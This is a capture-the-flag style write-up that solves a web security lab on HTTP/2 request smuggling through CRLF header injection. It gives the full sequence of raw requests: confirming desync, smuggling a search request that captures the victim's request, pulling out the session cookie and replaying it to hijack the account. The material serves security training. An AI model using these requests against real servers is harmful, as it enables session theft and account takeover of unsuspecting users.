## HTTP/2 request smuggling via CRLF injection

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

To solve the lab, use an HTTP/2-exclusive request smuggling vector to gain access to another user's account. The victim accesses the home page every 15 seconds.

If you're not familiar with Burp's exclusive features for HTTP/2 testing, please refer to the documentation for details on how to use them.

Hint :

To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the Shift + Return keys. Note that this feature is not available when you double-click on the header.

Hint :

We covered some ways you can capture other users' requests via request smuggling in a previous lab.

## Notes

- Possibility to leave a comment
- Search page
- Recent search feature
- `/login`

## Resume

1. Confirm HTTP/2 request smuggling via CRLF header injection
2. Create a desync using `Transfer-Encoding: chunked`
3. Smuggle a search request tied to your session
4. Poison the victim's recent search history
5. Leak the victim's request and session cookie
6. Reuse the stolen cookie to access the victim account

## Solve

Recent searches are tied to the current session.

Search request:

```http
POST / HTTP/2
Host: 0a56004e0323f8a980414eae009b007b.web-security-academy.net
Cookie: session=209ArVO7U6uy1PKgk4ZWaTcOBlUnlXix
Content-Type: application/x-www-form-urlencoded

search=test
```

Removing the session cookie resets the search history, confirming that recent searches are stored per-session.

Classic request smuggling attempts fail:

```http
POST / HTTP/2
Host: 0a56004e0323f8a980414eae009b007b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
X-Ignore: x
```

The vulnerability relies on HTTP/2 header injection using CRLF characters.

Using Burp's Inspector, add a custom header:

```http
foo: bar\r\n
Transfer-Encoding: chunked
```

Then send the following request:

```http
POST / HTTP/2
Host: 0a56004e0323f8a980414eae009b007b.web-security-academy.net
foo: bar\r\n
Transfer-Encoding: chunked

0

SMUGGLED
```

Every second request returns a `404`, confirming successful desynchronization and request smuggling.

Smuggle a search request associated with your session:

```http
POST / HTTP/2
Host: 0a56004e0323f8a980414eae009b007b.web-security-academy.net
foo: bar\r\n
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: 0a56004e0323f8a980414eae009b007b.web-security-academy.net
Cookie: session=209ArVO7U6uy1PKgk4ZWaTcOBlUnlXix
Content-Length: 1000
Content-Type: application/x-www-form-urlencoded

search=rxnnr82h
```

This creates a **Kettled Request**. When the victim's request is appended to the smuggled body, it becomes part of the search term stored in your recent searches.

After waiting for the victim to visit the site, the recent searches section contains:

```text
rxnnr82hGET / HTTP/1.1
Host: 0a56004e0323f8a980414eae009b007b.web-security-academy.net
sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange
cookie: session=inJfYoZe1excnFtzjf62Yd9SkwXZ5oHK
```

The victim's request is now visible inside your recent searches, including their session cookie.

Extract the victim session:

```text
session=inJfYoZe1excnFtzjf62Yd9SkwXZ5oHK
```

Use the stolen cookie to access the victim account:

```http
GET / HTTP/2
Host: 0a56004e0323f8a980414eae009b007b.web-security-academy.net
Cookie: session=inJfYoZe1excnFtzjf62Yd9SkwXZ5oHK
```

The response is returned in the victim's authenticated context, solving the lab.